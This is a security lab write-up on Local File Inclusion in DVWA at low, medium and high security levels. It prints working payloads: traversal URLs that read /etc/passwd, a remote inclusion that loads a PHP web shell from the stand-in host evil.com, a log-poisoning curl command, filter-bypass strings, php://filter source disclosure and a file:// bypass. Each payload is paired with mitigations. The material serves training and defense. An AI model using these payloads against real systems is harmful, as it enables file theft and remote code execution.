
# 📄 DVWA File Inclusion (LFI) – Low, Medium & High Security Analysis

---

## 📌 Overview
This document demonstrates a Local File Inclusion (LFI) vulnerability in the DVWA application under different security levels.

---

## ⚠️ Observation – Low Security

- ❌ No input validation
- ❌ Direct file inclusion via `$_GET['page']`
- ❌ No whitelisting or static routing
- ❌ No use of `basename()`, `realpath()`

### 🔒 Vulnerability Matrix

| Vulnerability            | Problem Description                                                                 |
|--------------------------|--------------------------------------------------------------------------------------|
| Local File Inclusion (LFI) | Arbitrary file inclusion via unvalidated input                                      |
| Remote File Inclusion (RFI) | If `allow_url_include` is enabled, external URLs can execute remote code           |
| Path Traversal           | Use of `../` allows navigating outside web root                                     |
| Lack of Input Validation | No filtering of dangerous characters, extensions, or file paths                     |

### 🧠 Component Summary

| Component        | Description                       |
|------------------|-----------------------------------|
| Vulnerability    | Local File Inclusion (LFI)        |
| Risk             | High                              |
| Attack Vector    | GET parameter injection           |
| Impact           | File disclosure, RCE              |
| Affected Param   | `page`                            |
| Security Level   | Low                               |

---

## 2️⃣ Exploitation – Low Security

### A. Local File Disclosure

```
http://127.0.0.1/DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd
```

### B. Remote File Inclusion (RFI)

```
http://127.0.0.1/DVWA/vulnerabilities/fi/?page=http://evil.com/shell.txt
```

**shell.txt**
```php
<?php system($_GET['cmd']); ?>
```

**Execution**
```
http://127.0.0.1/DVWA/vulnerabilities/fi/?page=http://evil.com/shell.txt&cmd=id
```

### C. Log Poisoning

```bash
curl -A "<?php system('id'); ?>" http://127.0.0.1/
?page=/var/log/apache2/access.log
```

---

## 4️⃣ Risk & Real-World Impact

| 🧠 Exploit Impact        | 🎯 Description                                                                  |
|--------------------------|----------------------------------------------------------------------------------|
| System File Disclosure   | Access to sensitive system files like `/etc/passwd`                             |
| Source Code Exposure     | Disclosure of internal code and secrets                                         |
| Remote Code Execution    | Full RCE via RFI or log injection                                               |
| Internal Reconnaissance  | Mapping of internal file structure or logs                                      |

---

## 5️⃣ 🚧 Mitigation Measures (Low)

| 🚫 Vulnerability         | ✅ Mitigation                                                                      |
|--------------------------|-------------------------------------------------------------------------------------|
| Unrestricted Inclusion   | Use strict whitelisting of include files                                           |
| Path Traversal           | Apply `realpath()` and verify base directory containment                          |
| Remote File Inclusion    | Disable `allow_url_include`, `allow_url_fopen` in `php.ini`                        |
| User-Controlled Input    | Use static routing instead of dynamic includes                                     |

---

## 🛡️ Medium Security Analysis

### 📌 Overview

Attempts to block LFI via `str_replace()`:

```php
$file = str_replace(array("http://", "https://"), "", $file);
$file = str_replace(array("../", "..\"), "", $file);
```

### 🔍 Bypass Techniques

- `..././` ➝ collapses to `../`
- `hthttp://tp://` ➝ becomes `http://`
- `php://filter` ➝ base64-encoded source code

### 🔒 Vulnerabilities Identified

| Vulnerability               | Problem Description                                                           |
|-----------------------------|-------------------------------------------------------------------------------|
| Incomplete Traversal Filter | Variants like `..././` are not matched by `../` filters                       |
| Protocol Obfuscation        | Bypasses with malformed `http://` strings                                     |
| Stream Wrappers             | No filtering of `php://`, `file://`, `data://`                                 |
| No Whitelisting             | Any file included if certain substrings avoided                               |
| No Extension Filtering      | Arbitrary file types can be loaded                                            |

---

## 2️⃣ Exploitation – Medium

### Payloads

✅ Traversal Bypass:
```
http://<target>/dvwa/vulnerabilities/fi/?page=..././..././etc/passwd
```

✅ RFI Obfuscation:
```
http://<target>/dvwa/vulnerabilities/fi/?page=hthttp://tp://127.0.0.1/shell.txt&cmd=id
```

✅ Source Code Disclosure:
```
http://<target>/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php
```

### 🎯 Indicators of Success

- `/etc/passwd` displayed
- Base64 source code shown
- Command executed via `cmd`

---

## 🛡️ High Security Analysis

### 📌 Overview

High security uses:

```php
if (!fnmatch("file*", $file) && $file != "include.php") { ... }
```

### 🔍 Vulnerabilities

| Vulnerability           | Problem Description                                                               |
|--------------------------|------------------------------------------------------------------------------------|
| Stream Wrapper Abuse    | `file://` accepted due to prefix match with `file*`                                |
| URI Scheme Bypass       | No blocking of dangerous schemes like `php://`, `data://`                          |
| Pattern Assumption      | Assumes `fnmatch("file*", ...)` protects against everything                        |
| Path vs URI Confusion   | Streams interpreted as filenames bypass logic                                      |

---

## 2️⃣ Exploitation – High

### Payload:

```
http://<target>/dvwa/vulnerabilities/fi/?page=file:///etc/passwd
```

- `fnmatch("file*", "file:///etc/passwd")` ➝ **returns true**

---

## 5️⃣ 🚧 Mitigation Measures (High)

| 🚫 Vulnerability       | ✅ Mitigation                                                                 |
|------------------------|--------------------------------------------------------------------------------|
| Stream Wrapper Usage   | Deny dangerous URIs (`file://`, `php://`, etc.) explicitly                     |
| Pattern Matching Flaw  | Avoid using `fnmatch()` alone; enforce static routing                          |
| Missing Extension Lock | Restrict includes to `.php` files only                                         |
| Protocol Filtering     | Validate input as plain filenames, disallow URI schemes                        |

---

📘 **Use secure coding principles. Only include whitelisted static files, apply canonicalization, and sanitize all user inputs.**
